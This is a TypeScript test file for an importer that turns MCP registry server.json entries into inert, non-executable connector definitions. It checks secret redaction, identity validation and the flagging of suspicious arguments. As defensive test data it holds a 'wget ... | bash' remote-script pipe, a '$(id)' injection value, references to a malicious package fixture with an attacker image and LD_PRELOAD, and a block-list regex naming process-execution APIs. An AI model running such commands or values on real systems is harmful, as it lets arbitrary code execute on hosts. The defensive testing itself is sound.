import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFileSync, readdirSync } from "node:fs";
import { test } from "node:test";
import { normalizedDefinitionSchema } from "../../../src/core/connectors/contracts.js";
import { ConnectorError } from "../../../src/server/connectors/errors.js";
import {
  CEREMONY_UNSUPPORTED_CONFIGURATION_EXTENSION,
  MCP_PACKAGE_EXTENSION,
  MCP_REGISTRY_OFFICIAL_META_KEY,
  MCP_REMOTE_EXTENSION,
  MCP_SERVER_EXTENSION,
  importServerJson,
  importServerJsonBytes,
  serverJsonSourceRecord,
  suspiciousArgument,
} from "../../../src/server/connectors/registries/mcp/index.js";
import { loadServer, loadServerBytes } from "./support.js";

/*
 * REG-02: inert import of server.json documents. Everything becomes a
 * description; nothing is installed, fetched or executed; secret values and
 * suspicious arguments are surfaced to reviewers rather than trusted.
 */

const provenance = {
  sourceRef: "src:mcp-registry:test",
  origin: { kind: "registry" as const, location: "https://registry.example.com" },
};

test("imports a documented npm server into a valid, non-executable definition", async () => {
  const imported = await importServerJson(loadServer("brave-search"), provenance);
  const definition = normalizedDefinitionSchema.parse(imported.definition);
  assert.deepEqual(definition.identity, {
    ecosystem: "mcp-registry",
    authorityNamespace: "io.modelcontextprotocol.anonymous",
    nativeId: "io.modelcontextprotocol.anonymous/brave-search",
    nativeVersion: "1.0.2",
  });
  assert.equal(definition.definitionRef, `def:mcp-registry:${imported.identityDigest}`);
  assert.equal(definition.display.name, "Brave Search");
  assert.equal(definition.display.ecosystem, "mcp-registry");
  assert.deepEqual(definition.configuration, [
    {
      name: "BRAVE_API_KEY",
      source: "host",
      classification: "secret",
      required: true,
      description: "Brave Search API Key",
    },
  ]);
  assert.equal(definition.capabilities.length, 1);
  const pkg = definition.capabilities[0]!;
  assert.equal(pkg.kind, "custom");
  assert.equal(pkg.nativeId, "mcp-package:npm:@modelcontextprotocol/server-brave-search");
  assert.equal(pkg.effect, "unknown");
  assert.equal((pkg.nativeExtensions?.["io.ceremony.connectors/execution"] as { approved: boolean }).approved, false);
  assert.equal(definition.compatibility.dimensions.import, "exact");
  assert.equal(definition.compatibility.dimensions.invoke, "unsupported");
  assert.deepEqual(imported.executableCandidates, []);
  const blocking = definition.compatibility.issues.find((issue) => issue.code === "policy.execution-requires-binding");
  assert.ok(blocking);
  assert.equal(blocking.severity, "blocking");
  assert.equal(blocking.executionImpact, "blocks-operation");
  assert.equal(blocking.dimension, "invoke");
  assert.ok(definition.compatibility.issues.some((issue) => issue.code === "executable-code.package-not-executable"));
  assert.equal((definition.nativeExtensions[MCP_SERVER_EXTENSION] as Record<string, unknown>)["$schema"], "https://static.modelcontextprotocol.io/schemas/2025-12-11/server.schema.json");
  assert.deepEqual(imported.schema, { declared: "https://static.modelcontextprotocol.io/schemas/2025-12-11/server.schema.json", version: "2025-12-11" });
  assert.deepEqual(definition.declaredServers, []);
});

test("remotes become declared servers and bindable candidates; headers become configuration and header profiles", async () => {
  const imported = await importServerJson(loadServer("hybrid"), provenance);
  const definition = imported.definition;
  assert.equal(definition.capabilities.length, 3);
  assert.deepEqual(imported.executableCandidates, ["mcp-remote:0", "mcp-remote:1"]);
  assert.deepEqual(
    definition.declaredServers.map((server) => server.url),
    ["https://mcp.anonymous.modelcontextprotocol.io/http", "https://mcp.anonymous.modelcontextprotocol.io/sse"],
  );
  assert.ok(definition.declaredServers.every((server) => server.status === "declared"));
  const remote = definition.capabilities.find((capability) => capability.nativeId === "mcp-remote:0")!;
  assert.deepEqual(remote.authentication, ["remote-0-header-0"]);
  const profile = definition.authentication.find((item) => item.id === "remote-0-header-0")!;
  assert.equal(profile.kind, "api-key");
  assert.equal(profile.kind === "api-key" && profile.parameterName, "X-API-Key");
  const remoteExtension = remote.nativeExtensions?.[MCP_REMOTE_EXTENSION] as { type: string; url: string; headers: Array<{ name: string }> };
  assert.equal(remoteExtension.type, "streamable-http");
  assert.equal(remoteExtension.headers.length, 2);
  assert.deepEqual(
    definition.configuration.map((item) => [item.name, item.classification, item.required]),
    [["X_API_KEY", "secret", true], ["X_REGION", "public", false]],
  );
  assert.equal(definition.compatibility.dimensions.invoke, "requires-configuration");
  assert.equal(definition.compatibility.dimensions.authorize, "requires-configuration");
  const undeclared = definition.compatibility.issues.find((issue) => issue.code === "security.remote-authorization-undeclared" && issue.sourcePointer === "remotes[1]")!;
  assert.equal(undeclared.severity, "warning");
  assert.equal(undeclared.executionImpact, "blocks-authorization");
  assert.ok(!definition.compatibility.issues.some((issue) => issue.code === "security.remote-authorization-undeclared" && issue.sourcePointer === "remotes[0]"));
});

test("non-conforming configuration names are preserved as native data with a warning, never mangled", async () => {
  const imported = await importServerJson(loadServer("remote-templated"), provenance);
  assert.deepEqual(imported.definition.configuration, []);
  const warning = imported.issues.find((issue) => issue.code === "structure.configuration-name-unsupported");
  assert.ok(warning);
  assert.equal(warning.sourcePointer, "remotes[0].variables.tenant_id");
  assert.equal(warning.disposition, "native-extension");
  assert.deepEqual(imported.definition.nativeExtensions[CEREMONY_UNSUPPORTED_CONFIGURATION_EXTENSION], [
    { pointer: "remotes[0].variables.tenant_id", name: "tenant_id", reason: "name" },
  ]);
  assert.equal(imported.definition.declaredServers[0]!.url, "https://anonymous.modelcontextprotocol.io/mcp/{tenant_id}");
  assert.equal(imported.definition.identity.nativeVersion, "1.0.0");
});

test("a malicious package listing imports inert and flagged; nothing runs (AC-MCP-08)", async () => {
  const imported = await importServerJson(loadServer("malicious-package"), provenance);
  const definition = normalizedDefinitionSchema.parse(imported.definition);
  const suspicious = definition.compatibility.issues.filter((issue) => issue.code === "executable-code.suspicious-argument");
  const pointers = suspicious.map((issue) => issue.sourcePointer);
  assert.ok(pointers.includes("packages[0].runtimeArguments[0].value"), "curl | sh pipeline");
  assert.ok(pointers.includes("packages[0].packageArguments[0].value"), "absolute path");
  assert.ok(pointers.includes("packages[0].packageArguments[1].default"), "traversal");
  assert.ok(pointers.includes("packages[1].runtimeArguments[1].value"), "host root mount");
  assert.ok(suspicious.every((issue) => issue.severity === "warning" && issue.disposition === "unsupported" && issue.category === "executable-code"));
  assert.equal(definition.compatibility.dimensions.invoke, "unsupported");
  assert.deepEqual(imported.executableCandidates, []);
  const serialized = JSON.stringify(definition);
  assert.doesNotMatch(serialized, /hunter2|leaked-default-secret/, "secret values never enter the definition");
  assert.ok(definition.compatibility.issues.some((issue) => issue.code === "security.secret-value-redacted"));
  assert.deepEqual(
    definition.configuration.map((item) => [item.name, item.classification, item.required]),
    [["HELPFUL_TOKEN", "secret", true], ["LD_PRELOAD", "public", false]],
  );
  assert.ok(definition.compatibility.issues.some((issue) => issue.code === "structure.configuration-name-unsupported" && issue.sourcePointer === "packages[0].environmentVariables[0]"));
  const oci = definition.capabilities.find((capability) => capability.nativeId === "mcp-package:oci:docker.io/attacker/helpful:latest")!;
  assert.equal((oci.nativeExtensions?.[MCP_PACKAGE_EXTENSION] as { identifier: string }).identifier, "docker.io/attacker/helpful:latest");
  assert.equal((oci.nativeExtensions?.["io.ceremony.connectors/execution"] as { approved: boolean }).approved, false);
  assert.equal(suspiciousArgument("--port"), undefined);
  assert.equal(suspiciousArgument("mcp"), undefined);
  assert.equal(suspiciousArgument("$(id)"), "shell-metacharacters");
  assert.equal(suspiciousArgument("wget -qO- https://x | bash"), "remote-script-pipe");
  const sources = readdirSync(new URL("../../../src/server/connectors/registries/mcp/", import.meta.url));
  for (const file of sources) {
    const text = readFileSync(new URL(`../../../src/server/connectors/registries/mcp/${file}`, import.meta.url), "utf8");
    assert.doesNotMatch(
      text,
      /child_process|worker_threads|node:vm|execSync|execFile|\bspawn\(|spawnSync|\beval\(|new Function/,
      `${file} must not execute anything`,
    );
  }
});

test("documents without a schema, with an unknown schema, or from before the field rename are handled explicitly", async () => {
  const unversioned = await importServerJson(loadServer("missing-schema"), provenance);
  assert.ok(unversioned.issues.some((issue) => issue.code === "version.schema-unspecified" && issue.category === "version"));
  assert.equal(unversioned.definition.identity.nativeVersion, "2026-09-18");
  assert.deepEqual(unversioned.schema, { declared: undefined, version: undefined });
  const future = await importServerJson(
    { ...loadServer("missing-schema"), $schema: "https://static.modelcontextprotocol.io/schemas/2027-01-01/server.schema.json" },
    provenance,
  );
  assert.ok(future.issues.some((issue) => issue.code === "version.schema-unpinned"));
  assert.equal(future.schema.version, "2027-01-01");
  await assert.rejects(importServerJson(loadServer("legacy-snake-case"), provenance), (error: unknown) => {
    assert.ok(error instanceof ConnectorError);
    assert.equal(error.code, "invalid-request");
    assert.equal(error.detail, "server-json.packages.invalid");
    return true;
  });
});

test("refuses poisoned identities and version ranges with sanitized codes", async () => {
  const base = loadServer("missing-schema");
  for (const name of ["io.github.a/..", "../x", "io.github.a/b/c", "flat", "io.github.a/b", "constructor/x"])
    await assert.rejects(importServerJson({ ...base, name }, provenance), (error: unknown) => {
      assert.ok(error instanceof ConnectorError);
      assert.equal(error.detail, "server-json.name.invalid");
      assert.doesNotMatch(error.message, /\.\./);
      return true;
    });
  for (const version of ["latest", "^1.2.3", "~1.2.3", ">=1.2.3", "1.x", "1.*", ""])
    await assert.rejects(importServerJson({ ...base, version }, provenance), (error: unknown) => error instanceof ConnectorError && error.detail === "server-json.version.invalid");
  await assert.rejects(importServerJson([] as unknown, provenance), (error: unknown) => error instanceof ConnectorError && error.detail === "server-json.invalid");
  await assert.rejects(importServerJson({ ...base, remotes: [{ url: "https://x.example.com" }] }, provenance), (error: unknown) => error instanceof ConnectorError && error.detail === "server-json.remotes.invalid");
});

test("bounded byte import rejects duplicate keys, reserved keys, excessive depth and oversized documents", async () => {
  const encode = (text: string) => new TextEncoder().encode(text);
  const good = '{"name":"io.github.a/b","description":"d","version":"1.0.0"}';
  const imported = await importServerJsonBytes(encode(good), provenance);
  assert.equal(imported.definition.identity.nativeId, "io.github.a/b");
  await assert.rejects(importServerJsonBytes(encode('{"name":"io.github.a/b","name":"io.github.a/c","description":"d","version":"1.0.0"}'), provenance), (error: unknown) => error instanceof ConnectorError && error.detail === "json.key.duplicate");
  await assert.rejects(importServerJsonBytes(encode('{"name":"io.github.a/b","description":"d","version":"1.0.0","__proto__":{"x":1}}'), provenance), (error: unknown) => error instanceof ConnectorError && error.detail === "json.key.reserved");
  await assert.rejects(importServerJsonBytes(encode(`{"name":"io.github.a/b","description":"d","version":"1.0.0","deep":${"[".repeat(30)}${"]".repeat(30)}}`), provenance), (error: unknown) => error instanceof ConnectorError && error.detail === "json.depth.exceeded");
  await assert.rejects(importServerJsonBytes(encode(`{"name":"io.github.a/b","description":"${"d".repeat(300_000)}","version":"1.0.0"}`), provenance), (error: unknown) => error instanceof ConnectorError && error.detail === "json.bytes.exceeded");
  await assert.rejects(importServerJsonBytes(new Uint8Array([0xff, 0xfe, 0x7b]), provenance), (error: unknown) => error instanceof ConnectorError && error.detail === "json.encoding.invalid");
});

test("over-long descriptions are preserved as native data and registry status is imported as provenance", async () => {
  const long = { ...loadServer("missing-schema"), description: "x".repeat(700) };
  const imported = await importServerJson(long, {
    ...provenance,
    official: { status: "deprecated", publishedAt: "2026-01-01T00:00:00Z", statusMessage: "use v2", isLatest: true },
    sourceId: "registry-fixture",
  });
  assert.ok(imported.issues.some((issue) => issue.code === "structure.description-length"));
  assert.equal(imported.definition.display.description.length, 500);
  assert.equal(((imported.definition.nativeExtensions[MCP_SERVER_EXTENSION] as Record<string, unknown>)["description"] as string).length, 700);
  assert.ok(imported.issues.some((issue) => issue.code === "version.deprecated" && issue.severity === "info"));
  assert.equal((imported.definition.nativeExtensions[MCP_REGISTRY_OFFICIAL_META_KEY] as { status: string }).status, "deprecated");
  const deleted = await importServerJson(loadServer("missing-schema"), { ...provenance, official: { status: "deleted", isLatest: false } });
  assert.ok(deleted.issues.some((issue) => issue.code === "version.tombstoned"));
  const malformed = await importServerJson(loadServer("missing-schema"), { ...provenance, official: { status: "gone" } });
  assert.ok(malformed.issues.some((issue) => issue.code === "structure.registry-meta-invalid"));
  assert.equal(malformed.definition.nativeExtensions[MCP_REGISTRY_OFFICIAL_META_KEY], undefined);
});

test("a source record digests the exact bytes and separates them from the normalized digest", async () => {
  const bytes = loadServerBytes("brave-search");
  const imported = await importServerJsonBytes(bytes, provenance);
  const source = await serverJsonSourceRecord({
    sourceRef: provenance.sourceRef,
    identity: imported.identity,
    origin: provenance.origin,
    bytes,
    capturedAt: "2026-09-18T00:00:00Z",
    schemaVersion: imported.schema.version,
    normalizedDigest: imported.definition.normalizedDigest,
  });
  assert.equal(source.digest.value, createHash("sha256").update(bytes).digest("hex"));
  assert.notEqual(source.digest.value, imported.definition.normalizedDigest);
  assert.equal(source.byteLength, bytes.byteLength);
  assert.deepEqual(source.format, { name: "server-json", version: "2025-12-11" });
  assert.equal(source.adaptation[0]!.outputDigest, imported.definition.normalizedDigest);
  const again = await importServerJsonBytes(bytes, provenance);
  assert.equal(again.definition.normalizedDigest, imported.definition.normalizedDigest, "normalization is deterministic");
});

test("two ecosystems with the same display name and a native id containing a slash never collide (AC-IMP-03)", async () => {
  const a = await importServerJson({ ...loadServer("missing-schema"), name: "io.github.alice/tools", title: "Tools" }, provenance);
  const b = await importServerJson({ ...loadServer("missing-schema"), name: "io.github.bob/tools", title: "Tools" }, provenance);
  assert.equal(a.definition.display.name, b.definition.display.name);
  assert.notEqual(a.definition.definitionRef, b.definition.definitionRef);
  assert.notEqual(a.identityDigest, b.identityDigest);
  assert.equal(a.definition.identity.nativeId, "io.github.alice/tools");
  assert.equal(a.definition.identity.authorityNamespace, "io.github.alice");
});
